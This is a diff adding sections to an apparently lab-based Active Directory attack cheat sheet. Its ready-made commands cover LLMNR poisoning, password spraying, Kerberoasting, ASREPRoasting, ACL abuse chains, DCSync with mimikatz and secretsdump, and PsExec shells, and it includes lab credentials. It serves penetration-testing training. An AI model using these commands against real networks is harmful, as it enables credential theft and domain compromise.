+      </div>
+    </div>
+
+    <!-- PASSWORD POLICY -->
+    <div class="section" id="pass-policy" data-tags="password policy lockout enum4linux crackmapexec rpcclient">
+      <div class="section-header">
+        <div class="section-icon" style="background:linear-gradient(135deg,#ce93d8,#6a1b9a)">🔒</div>
+        <div>
+          <div class="section-title">Password Policy Enumeration</div>
+          <div class="section-desc">Retrieve domain password policy to determine lockout thresholds before spraying.</div>
+        </div>
+      </div>
+      <div class="cards">
+
+        <div class="card">
+          <div class="card-header">
+            <div class="card-title">🐧 From Linux</div>
+            <span class="badge badge-linux">LINUX</span>
+          </div>
+          <div class="card-body">
+            <div class="code-block"><span class="comment"># Credentialed</span>
+crackmapexec smb 172.16.5.5 \
+  -u avazquez -p Password123 --pass-pol
+
+<span class="comment"># NULL session</span>
+rpcclient -U "" -N &lt;ip&gt;
+rpcclient $> querydominfo
+
+enum4linux -P 172.16.5.5
+enum4linux-ng -P 172.16.5.5 -oA ilfreight
+
+<span class="comment"># LDAP anonymous bind</span>
+ldapsearch -h 172.16.5.5 -x \
+  -b "DC=INLANEFREIGHT,DC=LOCAL" \
+  -s sub "*" | grep -m 1 -B 10 pwdHistoryLength
+
+<span class="comment"># No creds CME</span>
+crackmapexec smb ip --pass-pol -u '' -p ''</div>
+          </div>
+        </div>
+
+        <div class="card">
+          <div class="card-header">
+            <div class="card-title">🪟 From Windows</div>
+            <span class="badge badge-windows">WINDOWS</span>
+          </div>
+          <div class="card-body">
+            <div class="code-block"><span class="comment"># NULL session check</span>
+net use \\DC01\ipc$ "" /u:""
+
+<span class="comment"># PowerView</span>
+Import-Module .\PowerView.ps1
+Get-DomainPolicy
+
+<span class="comment"># Built-in</span>
+net accounts</div>
+          </div>
+        </div>
+
+      </div>
+    </div>
+
+    <!-- LLMNR POISONING -->
+    <div class="section" id="llmnr" data-tags="llmnr nbts poisoning responder inveigh ntlmv2 hashcat">
+      <div class="section-header">
+        <div class="section-icon" style="background:linear-gradient(135deg,#ef5350,#b71c1c)">🎣</div>
+        <div>
+          <div class="section-title">LLMNR / NBT-NS Poisoning</div>
+          <div class="section-desc">Capture NTLMv2 hashes by poisoning name resolution broadcasts on the local network.</div>
+        </div>
+      </div>
+      <div class="cards">
+
+        <div class="card">
+          <div class="card-header">
+            <div class="card-title">🐧 Responder (Linux)</div>
+            <span class="badge badge-linux">LINUX</span>
+          </div>
+          <div class="card-body">
+            <div class="card-note">Listen on the network interface and capture NTLMv2 hashes from victims trying to resolve non-existent names.</div>
+            <div class="code-block">ifconfig  <span class="comment"># find interface name</span>
+sudo responder -I &lt;interface_name&gt; -dwP</div>
+            <div class="code-block"><span class="comment"># Crack captured NTLMv2 hash</span>
+hashcat -m 5600 &lt;hash_file&gt; \
+  /usr/share/wordlists/rockyou.txt</div>
+          </div>
+        </div>
+
+        <div class="card">
+          <div class="card-header">
+            <div class="card-title">🪟 Inveigh (Windows)</div>
+            <span class="badge badge-windows">WINDOWS</span>
+          </div>
+          <div class="card-body">
+            <div class="card-note">PowerShell and C# port of Responder for Windows-based attacks.</div>
+            <div class="code-block"><span class="comment"># PowerShell version</span>
+Import-Module .\Inveigh.ps1
+Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y</div>
+            <div class="code-block"><span class="comment"># C# version (InveighZero)</span>
+.\Inveigh.exe
+<span class="comment"># Retrieve captured hashes:</span>
+GET NTLMV2UNIQUE
+GET NTLMV2USERNAMES</div>
+          </div>
+        </div>
+
+      </div>
+    </div>
+
+    <!-- CREDENTIALED ENUMERATION LINUX -->
+    <div class="section" id="cred-enum-linux" data-tags="credentialed enumeration linux crackmapexec smbmap windapsearch bloodhound impacket">
+      <div class="section-header">
+        <div class="section-icon" style="background:linear-gradient(135deg,#4fc3f7,#0277bd)">🐧</div>
+        <div>
+          <div class="section-title">Credentialed Enumeration — Linux</div>
+          <div class="section-desc">Deep enumeration with valid credentials from a Linux attack host.</div>
+        </div>
+      </div>
+      <div class="cards">
+
+        <div class="card">
+          <div class="card-header">
+            <div class="card-title">⚡ CrackMapExec</div>
+            <span class="badge badge-linux">LINUX</span>
+          </div>
+          <div class="card-body">
+            <div class="code-block"><span class="comment"># Domain Users</span>
+sudo crackmapexec smb 172.16.5.5 \
+  -u forend -p Klmcargo2 --users
+
+<span class="comment"># Domain Groups</span>
+sudo crackmapexec smb 172.16.5.5 \
+  -u forend -p Klmcargo2 --groups
+
+<span class="comment"># Logged on users</span>
+sudo crackmapexec smb 172.16.5.130 \
+  -u forend -p Klmcargo2 --loggedon-users
+
+<span class="comment"># Share enumeration</span>
+sudo crackmapexec smb 172.16.5.5 \
+  -u forend -p Klmcargo2 --shares
+
+<span class="comment"># Spider a share</span>
+sudo crackmapexec smb 172.16.5.5 \
+  -u forend -p Klmcargo2 \
+  -M spider_plus --share 'Department Shares'
+head -n 10 /tmp/cme_spider_plus/172.16.5.5.json</div>
+          </div>
+        </div>
+
+        <div class="card">
+          <div class="card-header">
+            <div class="card-title">🗺️ SMBMap</div>
+            <span class="badge badge-linux">LINUX</span>
+          </div>
+          <div class="card-body">
+            <div class="code-block"><span class="comment"># Check share access</span>
+smbmap -u forend -p Klmcargo2 \
+  -d INLANEFREIGHT.LOCAL -H 172.16.5.5
+
+<span class="comment"># Recursive directory listing</span>
+smbmap -u forend -p Klmcargo2 \
+  -d INLANEFREIGHT.LOCAL -H 172.16.5.5 \
+  -R 'Department Shares' --dir-only</div>
+          </div>
+        </div>
+
+        <div class="card">
+          <div class="card-header">
+            <div class="card-title">🔧 Impacket Suite</div>
+            <span class="badge badge-linux">LINUX</span>
+          </div>
+          <div class="card-body">
+            <div class="code-block"><span class="comment"># PsExec - full SYSTEM shell</span>
+psexec.py inlanefreight.local/wley:'transporter@4'@172.16.5.125
+
+<span class="comment"># WMI exec - stealthier</span>
+wmiexec.py inlanefreight.local/wley:'transporter@4'@172.16.5.5</div>
+          </div>
+        </div>
+
+        <div class="card">
+          <div class="card-header">
+            <div class="card-title">🩸 BloodHound / SharpHound</div>
+            <span class="badge badge-both">BOTH</span>
+          </div>
+          <div class="card-body">
+            <div class="card-note">Collect all AD data for graph-based attack path analysis. Ingest the zip into the BloodHound GUI.</div>
+            <div class="code-block"><span class="comment"># Windows - collect all data</span>
+.\SharpHound.exe -c All --zipfilename ILFREIGHT
+
+<span class="comment"># Linux - bloodhound-python</span>
+bloodhound-python -u forend \
+  -p Klmcargo2 -d inlanefreight.local \
+  -dc 172.16.5.5 -c all</div>
+            <div class="card-note" style="margin-top:0.6rem">Upload zip via BloodHound GUI → Upload Data → select zip → wait for 100% on all JSON files.</div>
+          </div>
+        </div>
+
+        <div class="card">
+          <div class="card-header">
+            <div class="card-title">🐍 Password Spray (No Brute Force)</div>
+            <span class="badge badge-linux">LINUX</span>
+          </div>
+          <div class="card-body">
+            <div class="code-block"><span class="comment"># Spray hashes without bruteforce</span>
+crackmapexec &lt;protocol&gt; &lt;targets&gt; \
+  -u ~/users -H ~/hashes --no-bruteforce
+
+<span class="comment"># Spray passwords</span>
+crackmapexec &lt;protocol&gt; &lt;targets&gt; \
+  -u ~/users -p ~/passwords --no-bruteforce</div>
+          </div>
+        </div>
+
+      </div>
+    </div>
+
+    <!-- CREDENTIALED ENUMERATION WINDOWS -->
+    <div class="section" id="cred-enum-win" data-tags="credentialed enumeration windows powerview activedirectory sharpview snaffler bloodhound">
+      <div class="section-header">
+        <div class="section-icon" style="background:linear-gradient(135deg,#81c784,#1b5e20)">🪟</div>
+        <div>
+          <div class="section-title">Credentialed Enumeration — Windows</div>
+          <div class="section-desc">Enumerate AD from a Windows host using built-in cmdlets, PowerView, SharpView, and Snaffler.</div>
+        </div>
+      </div>
+      <div class="cards">
+
+        <div class="card">
+          <div class="card-header">
+            <div class="card-title">📦 ActiveDirectory Module</div>
+            <span class="badge badge-windows">WINDOWS</span>
+          </div>
+          <div class="card-body">
+            <div class="code-block">Import-Module ActiveDirectory
+
+<span class="comment"># Domain info (SID, functional level, child domains)</span>
+Get-ADDomain
+
+<span class="comment"># Users with SPN set (Kerberoastable)</span>
+Get-ADUser -Filter {ServicePrincipalName -ne "$null"} \
+  -Properties ServicePrincipalName
+
+<span class="comment"># Trust relationships</span>
+Get-ADTrust -Filter *
+
+<span class="comment"># Group enumeration</span>
+Get-ADGroup -Filter * | select name
+Get-ADGroup -Identity "Backup Operators"
+Get-ADGroupMember -Identity "Backup Operators"</div>
+          </div>
+        </div>
+
+        <div class="card">
+          <div class="card-header">
+            <div class="card-title">👁️ PowerView</div>
+            <span class="badge badge-windows">WINDOWS</span>
+          </div>
+          <div class="card-body">
+            <div class="code-block">Import-Module .\PowerView.ps1
+
+<span class="comment"># Detailed user info</span>
+Get-DomainUser -Identity mmorgan \
+  -Domain inlanefreight.local | Select-Object \
+  name,samaccountname,description,memberof, \
+  whencreated,pwdlastset,lastlogontimestamp, \
+  admincount,userprincipalname,serviceprincipalname
+
+<span class="comment"># Recursive group membership</span>
+Get-DomainGroupMember -Identity "Domain Admins" -Recurse
+
+<span class="comment"># Trust mapping</span>
+Get-DomainTrustMapping
+
+<span class="comment"># Test local admin access</span>
+Test-AdminAccess -ComputerName ACADEMY-EA-MS01
+
+<span class="comment"># Find Kerberoastable users</span>
+Get-DomainUser -SPN -Properties samaccountname,ServicePrincipalName</div>
+          </div>
+        </div>
+
+        <div class="card">
+          <div class="card-header">
+            <div class="card-title">🔭 SharpView</div>
+            <span class="badge badge-windows">WINDOWS</span>
+          </div>
+          <div class="card-body">
+            <div class="card-note">C# port of PowerView. Useful when PowerShell is restricted.</div>
+            <div class="code-block">.\SharpView.exe Get-DomainUser -Identity forend</div>
+          </div>
+        </div>
+
+        <div class="card">
+          <div class="card-header">
+            <div class="card-title">🕵️ Snaffler — File Share Mining</div>
+            <span class="badge badge-windows">WINDOWS</span>
+          </div>
+          <div class="card-body">
+            <div class="card-note">Automatically hunt for passwords, SSH keys, and config files across accessible shares. Color-coded output. Extremely useful for credential discovery.</div>
+            <div class="code-block">Snaffler.exe -s -d inlanefreight.local \
+  -o snaffler.log -v data</div>
+          </div>
+        </div>
+
+        <div class="card">
+          <div class="card-header">
+            <div class="card-title">🌐 BloodHound Cypher Queries</div>
+            <span class="badge badge-both">BOTH</span>
+          </div>
+          <div class="card-body">
+            <div class="card-note">Custom Cypher queries for hunting specific access rights in BloodHound.</div>
+            <div class="code-block"><span class="comment"># WinRM access via group membership</span>
+MATCH p1=shortestPath((u1:User)-[r1:MemberOf*1..]->(g1:Group))
+MATCH p2=(u1)-[:CanPSRemote*1..]->(c:Computer) RETURN p2
+
+<span class="comment"># SQL Admin access</span>
+MATCH p1=shortestPath((u1:User)-[r1:MemberOf*1..]->(g1:Group))
+MATCH p2=(u1)-[:SQLAdmin*1..]->(c:Computer) RETURN p2</div>
+          </div>
+        </div>
+
+      </div>
+    </div>
+
+    <!-- PASSWORD SPRAYING -->
+    <div class="section" id="spray" data-tags="password spraying crackmapexec kerbrute rpcclient domain spray">
+      <div class="section-header">
+        <div class="section-icon" style="background:linear-gradient(135deg,#ffb74d,#e65100)">💧</div>
+        <div>
+          <div class="section-title">Password Spraying</div>
+          <div class="section-desc">Test one or few passwords against many accounts to avoid lockout. Always check policy first!</div>
+        </div>
+      </div>
+      <div class="cards">
+
+        <div class="card">
+          <div class="card-header">
+            <div class="card-title">🐧 From Linux</div>
+            <span class="badge badge-linux">LINUX</span>
+          </div>
+          <div class="card-body">
+            <div class="code-block"><span class="comment"># rpcclient spray</span>
+for u in $(cat valid_users.txt); do \
+  rpcclient -U "$u%Welcome1" \
+  -c "getusername;quit" 172.16.5.5 \
+  | grep Authority; done
+
+<span class="comment"># Kerbrute spray</span>
+kerbrute passwordspray -d inlanefreight.local \
+  --dc 172.16.5.5 valid_users.txt Welcome1
+
+<span class="comment"># CrackMapExec (filter failures)</span>
+sudo crackmapexec smb 172.16.5.5 \
+  -u valid_users.txt -p Password123 | grep +
+
+<span class="comment"># Validate found credential</span>
+sudo crackmapexec smb 172.16.5.5 \
+  -u avazquez -p Password123</span></div>
+          </div>
+        </div>
+
+        <div class="card">
+          <div class="card-header">
+            <div class="card-title">🪟 From Windows</div>
+            <span class="badge badge-windows">WINDOWS</span>
+          </div>
+          <div class="card-body">
+            <div class="code-block">Import-Module .\DomainPasswordSpray.ps1
+Invoke-DomainPasswordSpray -Password Welcome1 \
+  -OutFile spray_success -ErrorAction SilentlyContinue</div>
+          </div>
+        </div>
+
+        <div class="card">
+          <div class="card-header">
+            <div class="card-title">🖥️ Local Admin Spraying</div>
+            <span class="badge badge-linux">LINUX</span>
+          </div>
+          <div class="card-body">
+            <div class="card-note">Spray local administrator hash across the subnet to find password reuse.</div>
+            <div class="code-block">sudo crackmapexec smb --local-auth \
+  172.16.5.0/23 -u administrator \
+  -H 88ad09182de639ccc6579eb0849751cf | grep +</div>
+          </div>
+        </div>
+
+      </div>
+    </div>
+
+    <!-- KERBEROASTING -->
+    <div class="section" id="kerb" data-tags="kerberoasting rubeus getuserspns tgs spn hashcat impacket">
+      <div class="section-header">
+        <div class="section-icon" style="background:linear-gradient(135deg,#ce93d8,#4a148c)">🎟️</div>
+        <div>
+          <div class="section-title">Kerberoasting</div>
+          <div class="section-desc">Request TGS tickets for accounts with SPNs and crack them offline. Requires any valid domain user credential.</div>
+        </div>
+      </div>
+      <div class="cards">
+
+        <div class="card">
+          <div class="card-header">
+            <div class="card-title">🐧 From Linux — GetUserSPNs.py</div>
+            <span class="badge badge-linux">LINUX</span>
+          </div>
+          <div class="card-body">
+            <div class="code-block"><span class="comment"># List SPN accounts</span>
+impacket-GetUserSPNs -dc-ip 172.16.5.5 \
+  INLANEFREIGHT.LOCAL/forend
+
+<span class="comment"># Request all TGS tickets</span>
+impacket-GetUserSPNs -dc-ip 172.16.5.5 \
+  INLANEFREIGHT.LOCAL/forend -request
+
+<span class="comment"># Single user ticket</span>
+GetUserSPNs.py -dc-ip 172.16.5.5 \
+  INLANEFREIGHT.LOCAL/forend \
+  -request-user sqldev -outputfile sqldev_tgs
+
+<span class="comment"># Crack the ticket</span>
+hashcat -m 13100 sqldev_tgs \
+  /usr/share/wordlists/rockyou.txt</div>
+          </div>
+        </div>
+
+        <div class="card">
+          <div class="card-header">
+            <div class="card-title">🪟 Rubeus (Windows)</div>
+            <span class="badge badge-windows">WINDOWS</span>
+          </div>
+          <div class="card-body">
+            <div class="links-row" style="margin-bottom:0.6rem">
+              <a class="ext-link" href="https://github.com/GhostPack/Rubeus" target="_blank">↗ Rubeus (GhostPack)</a>
+            </div>
+            <div class="code-block"><span class="comment"># Kerberoast with nowrap (easier cracking)</span>
+.\Rubeus.exe kerberoast /user:adunn /nowrap
+
+<span class="comment"># Only high-value accounts (admincount=1)</span>
+.\Rubeus.exe kerberoast \
+  /ldapfilter:'admincount=1' /nowrap
+
+<span class="comment"># Force RC4 (type 23) downgrade</span>
+.\Rubeus.exe kerberoast /user:testspn \
+  /tgtdeleg /nowrap</div>
+            <div class="card-note" style="margin-top:0.5rem">Hash modes: RC4 → <code style="color:var(--accent3)">-m 13100</code>  |  AES-128 → <code style="color:var(--accent3)">-m 19700</code>  |  AES-256 → <code style="color:var(--accent3)">-m 19700</code></div>
+          </div>
+        </div>
+
+        <div class="card">
+          <div class="card-header">
+            <div class="card-title">🪟 PowerView — SPN Tickets</div>
+            <span class="badge badge-windows">WINDOWS</span>
+          </div>
+          <div class="card-body">
+            <div class="code-block"><span class="comment"># Check encryption types</span>
+Get-DomainUser testspn -Properties \
+  samaccountname,serviceprincipalname, \
+  msds-supportedencryptiontypes
+
+<span class="comment"># Request ticket for user</span>
+Get-DomainUser -Identity sqldev | \
+  Get-DomainSPNTicket -Format Hashcat
+
+<span class="comment"># Export all to CSV</span>
+Get-DomainUser * -SPN | \
+  Get-DomainSPNTicket -Format Hashcat | \
+  Export-Csv .\ilfreight_tgs.csv -NoTypeInformation</div>
+          </div>
+        </div>
+
+        <div class="card">
+          <div class="card-header">
+            <div class="card-title">🪟 Manual via setspn / Mimikatz</div>
+            <span class="badge badge-windows">WINDOWS</span>
+          </div>
+          <div class="card-body">
+            <div class="code-block"><span class="comment"># Enumerate SPNs</span>
+setspn.exe -Q */*
+setspn.exe -T INLANEFREIGHT.LOCAL -Q */*
+
+<span class="comment"># Request TGS into memory</span>
+Add-Type -AssemblyName System.IdentityModel
+New-Object System.IdentityModel.Tokens. \
+  KerberosRequestorSecurityToken \
+  -ArgumentList "MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433"
+
+<span class="comment"># Export with Mimikatz</span>
+kerberos::list /export</div>
+            <div class="code-block"><span class="comment"># Convert kirbi to hashcat format</span>
+python2.7 kirbi2john.py sqldev.kirbi
+sed 's/\$krb5tgs\$\(.\):\(.\)/\$krb5tgs\$23\$\\1\\$\2/' \
+  crack_file > sqldev_tgs_hashcat
+hashcat -m 13100 sqldev_tgs_hashcat \
+  /usr/share/wordlists/rockyou.txt</div>
+          </div>
+        </div>
+
+        <div class="card">
+          <div class="card-header">
+            <div class="card-title">🌐 Cross-Forest Kerberoasting</div>
+            <span class="badge badge-both">BOTH</span>
+          </div>
+          <div class="card-body">
+            <div class="code-block"><span class="comment"># Linux</span>
+GetUserSPNs.py -target-domain \
+  FREIGHTLOGISTICS.LOCAL \
+  INLANEFREIGHT.LOCAL/wley
+
+GetUserSPNs.py -request -target-domain \
+  FREIGHTLOGISTICS.LOCAL \
+  INLANEFREIGHT.LOCAL/wley -request-user ttimmons
+
+<span class="comment"># Windows with Rubeus</span>
+.\Rubeus.exe kerberoast \
+  /domain:FREIGHTLOGISTICS.LOCAL \
+  /user:mssqlsvc /nowrap</div>
+          </div>
+        </div>
+
+      </div>
+    </div>
+
+    <!-- ASREPRoasting -->
+    <div class="section" id="asrep" data-tags="asreproast asrep getnpusers rubeus hashcat preauthentication">
+      <div class="section-header">
+        <div class="section-icon" style="background:linear-gradient(135deg,#4fc3f7,#01579b)">🔓</div>
+        <div>
+          <div class="section-title">ASREPRoasting</div>
+          <div class="section-desc">Attack accounts with Kerberos pre-authentication disabled. No credentials needed for enumeration.</div>
+        </div>
+      </div>
+      <div class="cards">
+
+        <div class="card">
+          <div class="card-header">
+            <div class="card-title">🐧 From Linux — GetNPUsers.py</div>
+            <span class="badge badge-linux">LINUX</span>
+          </div>
+          <div class="card-body">
+            <div class="code-block"><span class="comment"># Without creds (need userlist)</span>
+GetNPUsers.py EGOTISTICALBANK.LOCAL/ \
+  -usersfile users.txt -dc-ip 10.10.10.175
+
+<span class="comment"># With valid AD users list</span>
+GetNPUsers.py INLANEFREIGHT.LOCAL/ \
+  -dc-ip 172.16.5.5 -no-pass \
+  -usersfile valid_ad_users
+
+<span class="comment"># Loop through users</span>
+for user in $(cat users.txt); do \
+  python3 GetNPUsers.py -no-pass \
+  -dc-ip 10.10.10.161 htb/${user} \
+  | grep -v Impacket; done
+
+<span class="comment"># Crack AS-REP hash</span>
+hashcat -m 18200 ilfreight_asrep \
+  /usr/share/wordlists/rockyou.txt</div>
+          </div>
+        </div>
+
+        <div class="card">
+          <div class="card-header">
+            <div class="card-title">🪟 From Windows</div>
+            <span class="badge badge-windows">WINDOWS</span>
+          </div>
+          <div class="card-body">
+            <div class="card-note">Find accounts with "Do not require Kerberos pre-authentication" set. Check via ADUC or PowerView.</div>
+            <div class="code-block"><span class="comment"># PowerView: find vulnerable accounts</span>
+Get-DomainUser -PreauthNotRequired | \
+  select samaccountname, \
+  userprincipalname, useraccountcontrol | fl
+
+<span class="comment"># Rubeus: retrieve AS-REP hash</span>
+.\Rubeus.exe asreproast \
+  /user:&lt;samaccountname&gt; \
+  /nowrap /format:hashcat
+
+<span class="comment"># Crack</span>
+hashcat -m 18200 ilfreight_asrep \
+  /usr/share/wordlists/rockyou.txt</div>
+          </div>
+        </div>
+
+        <div class="card">
+          <div class="card-header">
+            <div class="card-title">🔍 Kerbrute — Pre-auth Not Required</div>
+            <span class="badge badge-linux">LINUX</span>
+          </div>
+          <div class="card-body">
+            <div class="code-block"><span class="comment"># Kerbrute identifies accounts without preauth</span>
+kerbrute userenum -d inlanefreight.local \
+  --dc 172.16.5.5 /opt/jsmith.txt</div>
+          </div>
+        </div>
+
+      </div>
+    </div>
+
+    <!-- ACL ABUSE -->
+    <div class="section" id="acl" data-tags="acl access control list powerview dacl genericall genericwrite writedacl force change password kerberoast">
+      <div class="section-header">
+        <div class="section-icon" style="background:linear-gradient(135deg,#ef5350,#7f0000)">🔑</div>
+        <div>
+          <div class="section-title">ACL Enumeration & Abuse</div>
+          <div class="section-desc">Identify misconfigured ACLs and chain them together for privilege escalation to Domain Admin.</div>
+        </div>
+      </div>
+      <div class="cards">
+
+        <div class="card">
+          <div class="card-header">
+            <div class="card-title">🔍 ACL Enumeration with PowerView</div>
+            <span class="badge badge-windows">WINDOWS</span>
+          </div>
+          <div class="card-body">
+            <div class="code-block"><span class="comment"># Get SID of user</span>
+$sid = Convert-NameToSid wley
+
+<span class="comment"># Find ACLs for that SID (readable format)</span>
+Get-DomainObjectACL -ResolveGUIDs -Identity * | \
+  ? {$_.SecurityIdentifier -eq $sid}
+
+<span class="comment"># Check all domain users in a loop</span>
+Get-ADUser -Filter * | Select-Object \
+  -ExpandProperty SamAccountName > ad_users.txt
+
+foreach($line in [System.IO.File]::ReadLines(
+  "C:\Users\htbstudent\Desktop\ad_users.txt")) {
+  get-acl "AD:\$(Get-ADUser $line)" | \
+  Select-Object Path -ExpandProperty Access | \
+  Where-Object {$_.IdentityReference -match 'INLANEFREIGHT\\wley'}
+}</div>
+          </div>
+        </div>
+
+        <div class="card">
+          <div class="card-header">
+            <div class="card-title">⛓️ ACL Attack Chain Example</div>
+            <span class="badge badge-warn">CRITICAL</span>
+          </div>
+          <div class="card-body">
+            <div class="steps">
+              <div class="step"><div class="step-num">1</div><span>Capture <strong>wley</strong>'s NTLMv2 hash via Responder, crack with Hashcat</span></div>
+              <div class="step"><div class="step-num">2</div><span><strong>wley</strong> has <code>User-Force-Change-Password</code> right over <strong>damundsen</strong></span></div>
+              <div class="step"><div class="step-num">3</div><span><strong>damundsen</strong> has <code>GenericWrite</code> over <strong>Help Desk Level 1</strong> group</span></div>
+              <div class="step"><div class="step-num">4</div><span><strong>Help Desk Level 1</strong> is nested in <strong>Information Technology</strong> group</span></div>
+              <div class="step"><div class="step-num">5</div><span><strong>adunn</strong> (IT group member) has <code>DS-Replication-Get-Changes</code> → <strong>DCSync!</strong></span></div>
+            </div>
+          </div>
+        </div>
+
+        <div class="card">
+          <div class="card-header">
+            <div class="card-title">🔄 Force Password Change (wley → damundsen)</div>
+            <span class="badge badge-windows">WINDOWS</span>
+          </div>
+          <div class="card-body">
+            <div class="code-block"><span class="comment"># Authenticate as wley</span>
+$SecPassword = ConvertTo-SecureString \
+  '&lt;wley_password&gt;' -AsPlainText -Force
+$Cred = New-Object \
+  System.Management.Automation.PSCredential(
+  'INLANEFREIGHT\wley', $SecPassword)
+
+<span class="comment"># Set damundsen's new password</span>
+$damundsenPassword = ConvertTo-SecureString \
+  'Pwn3d_by_ACLs!' -AsPlainText -Force
+
+Import-Module .\PowerView.ps1
+Set-DomainUserPassword -Identity damundsen \
+  -AccountPassword $damundsenPassword \
+  -Credential $Cred -Verbose</div>
+          </div>
+        </div>
+
+        <div class="card">
+          <div class="card-header">
+            <div class="card-title">➕ Add User to Group (damundsen → Help Desk)</div>
+            <span class="badge badge-windows">WINDOWS</span>
+          </div>
+          <div class="card-body">
+            <div class="code-block"><span class="comment"># Authenticate as damundsen</span>
+$SecPassword = ConvertTo-SecureString \
+  'Pwn3d_by_ACLs!' -AsPlainText -Force
+$Cred2 = New-Object \
+  System.Management.Automation.PSCredential(
+  'INLANEFREIGHT\damundsen', $SecPassword)
+
+<span class="comment"># Add to Help Desk Level 1</span>
+Add-DomainGroupMember \
+  -Identity 'Help Desk Level 1' \
+  -Members 'damundsen' \
+  -Credential $Cred2 -Verbose
+
+<span class="comment"># Confirm membership</span>
+Get-DomainGroupMember \
+  -Identity "Help Desk Level 1" | Select MemberName</div>
+            <div class="card-note" style="margin-top:0.5rem; color:var(--accent3)">⚠️ "PrincipalExistsException" error can occur but the operation still succeeds.</div>
+          </div>
+        </div>
+
+        <div class="card">
+          <div class="card-header">
+            <div class="card-title">🎯 Create Fake SPN → Kerberoast adunn</div>
+            <span class="badge badge-windows">WINDOWS</span>
+          </div>
+          <div class="card-body">
+            <div class="code-block"><span class="comment"># Set SPN on adunn (GenericWrite via IT group)</span>
+Set-DomainObject -Credential $Cred2 \
+  -Identity adunn \
+  -SET @{serviceprincipalname='notahacker/LEGIT'} \
+  -Verbose
+
+<span class="comment"># Kerberoast adunn</span>
+.\Rubeus.exe kerberoast /user:adunn /nowrap</div>
+          </div>
+        </div>
+
+        <div class="card">
+          <div class="card-header">
+            <div class="card-title">📖 ACL Reference</div>
+            <span class="badge badge-tool">REFERENCE</span>
+          </div>
+          <div class="card-body">
+            <div class="links-row">
+              <a class="ext-link" href="https://learn.microsoft.com/en-us/windows/win32/adschema/r-user-force-change-password" target="_blank">↗ User-Force-Change-Password (MS Docs)</a>
+              <a class="ext-link" href="https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/acl-persistence-abuse" target="_blank">↗ HackTricks ACL Abuse</a>
+            </div>
+          </div>
+        </div>
+
+      </div>
+    </div>
+
+    <!-- DCSYNC -->
+    <div class="section" id="dcsync" data-tags="dcsync mimikatz secretsdump replication ntlm hashes domain admin">
+      <div class="section-header">
+        <div class="section-icon" style="background:linear-gradient(135deg,#ffb74d,#bf360c)">💀</div>
+        <div>
+          <div class="section-title">DCSync Attack</div>
+          <div class="section-desc">Simulate a Domain Controller to pull NTLM hashes for all domain users. Requires Replicating Directory Changes All permissions.</div>
+        </div>
+      </div>
+      <div class="cards">
+
+        <div class="card">
+          <div class="card-header">
+            <div class="card-title">✅ Verify DCSync Rights</div>
+            <span class="badge badge-windows">WINDOWS</span>
+          </div>
+          <div class="card-body">
+            <div class="code-block"><span class="comment"># Check adunn's replication rights</span>
+Get-DomainUser -Identity adunn | \
+  select samaccountname,objectsid,memberof
+
+$sid= "S-1-5-21-3842939050-3880317879-2865463114-1164"
+Get-ObjectAcl "DC=inlanefreight,DC=local" \
+  -ResolveGUIDs | \
+  ? { ($_.ObjectAceType -match 'Replication-Get')} | \
+  ? {$_.SecurityIdentifier -match $sid} | \
+  select AceQualifier,ObjectDN,ActiveDirectoryRights</div>
+          </div>
+        </div>
+
+        <div class="card">
+          <div class="card-header">
+            <div class="card-title">🐧 secretsdump.py (Linux)</div>
+            <span class="badge badge-linux">LINUX</span>
+          </div>
+          <div class="card-body">
+            <div class="code-block"><span class="comment"># Dump all hashes</span>
+secretsdump.py -outputfile inlanefreight_hashes \
+  -just-dc INLANEFREIGHT/adunn@172.16.5.5
+
+<span class="comment"># Via proxy</span>
+proxychains secretsdump.py \
+  ttimmons@172.16.8.3 -just-dc
+
+<span class="comment"># View cleartext passwords (reversible encryption)</span>
+cat inlanefreight_hashes.ntds.cleartext</div>
+          </div>
+        </div>
+
+        <div class="card">
+          <div class="card-header">
+            <div class="card-title">🪟 Mimikatz (Windows)</div>
+            <span class="badge badge-windows">WINDOWS</span>
+          </div>
+          <div class="card-body">
+            <div class="code-block"><span class="comment"># Run as adunn using runas</span>
+runas /netonly /user:INLANEFREIGHT\adunn powershell
+
+<span class="comment"># In Mimikatz</span>
+privilege::debug
+lsadump::dcsync /domain:INLANEFREIGHT.LOCAL /user:INLANEFREIGHT\krbtgt
+lsadump::dcsync /domain:INLANEFREIGHT.LOCAL /user:INLANEFREIGHT\khartsfield</div>
+          </div>
+        </div>
+
+        <div class="card">
+          <div class="card-header">
+            <div class="card-title">🔐 Reversible Encryption Check</div>
+            <span class="badge badge-windows">WINDOWS</span>
+          </div>
+          <div class="card-body">
+            <div class="card-note">Some accounts store passwords with reversible encryption — these can be decrypted to cleartext.</div>
+            <div class="code-block">Get-DomainUser -Identity * | \
+  ? {$_.useraccountcontrol -like '*ENCRYPTED_TEXT_PWD_ALLOWED*'} | \
+  select samaccountname,useraccountcontrol</div>
+          </div>
+        </div>
+
+        <div class="card">
+          <div class="card-header">
+            <div class="card-title">🗑️ AD Recycle Bin — Recover Deleted Objects</div>
+            <span class="badge badge-windows">WINDOWS</span>
+          </div>
+          <div class="card-body">
+            <div class="card-note">Deleted AD objects may still contain useful attribute data including old passwords.</div>
+            <div class="code-block">Get-ADObject -filter \
+  'isdeleted -eq $true -and name -ne "Deleted Objects"' \
+  -includeDeletedObjects -property *</div>
+          </div>
+        </div>
+
+      </div>
+    </div>
+
+    <!-- REMOTE ACCESS -->
+    <div class="section" id="access" data-tags="remote access rdp winrm sql evil-winrm mssql psremote">
+      <div class="section-header">
+        <div class="section-icon" style="background:linear-gradient(135deg,#81c784,#2e7d32)">🖥️</div>
+        <div>
+          <div class="section-title">Remote Access</div>
+          <div class="section-desc">Establish access via RDP, WinRM, or SQL using compromised credentials.</div>
+        </div>
+      </div>
+      <div class="cards">
+
+        <div class="card">
+          <div class="card-header">
+            <div class="card-title">🖥️ RDP Enumeration & Access</div>
+            <span class="badge badge-both">BOTH</span>
+          </div>
+          <div class="card-body">
+            <div class="code-block"><span class="comment"># Enumerate RDP group members</span>
+Get-NetLocalGroupMember -ComputerName ACADEMY-EA-MS01 \
+  -GroupName "Remote Desktop Users"</div>
+            <div class="card-note" style="margin-top:0.5rem">BloodHound → Node Info → Execution Rights. Or use pre-built queries: <em>"Find Workstations where Domain Users can RDP"</em></div>
+            <div class="code-block"><span class="comment"># Linux</span>
+xfreerdp /u:forend /p:Klmcargo2 /v:172.16.5.130
+<span class="comment"># Windows</span>
+mstsc.exe</div>
